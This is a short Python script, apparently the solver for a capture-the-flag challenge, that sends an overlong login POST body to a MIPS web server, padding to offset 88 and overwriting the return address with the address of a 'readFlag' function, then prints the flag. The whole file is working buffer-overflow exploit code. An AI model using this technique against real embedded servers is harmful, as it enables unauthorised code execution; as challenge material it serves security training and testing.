import os
import sys
import struct
import requests

def getReadFlag():
    path = os.path.join(os.path.dirname(__file__), "../src/httpd/httpd.out")
    address = os.popen(f"mips-linux-gnu-objdump -t {path} | grep readFlag | cut -d \" \" -f 1").read()
    return int(f"0x{address}", 16)

def main(ip, port):
    url = f"http://{ip}:{port}/login"
    payload = b"user=admin&pass=notcomplexjustnotguessable\x00"
    payload += b"A" * (88 - len(payload))
    payload += struct.pack(">I", getReadFlag())
    r = requests.post(url, data=payload, timeout=5, allow_redirects=False)
    flag = r.text.split('\r\n\r\n')[1]
    print(flag, end="")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage:")
        print(f"\t{sys.argv[0]} IP PORT")
        exit(0)
    main(sys.argv[1], sys.argv[2])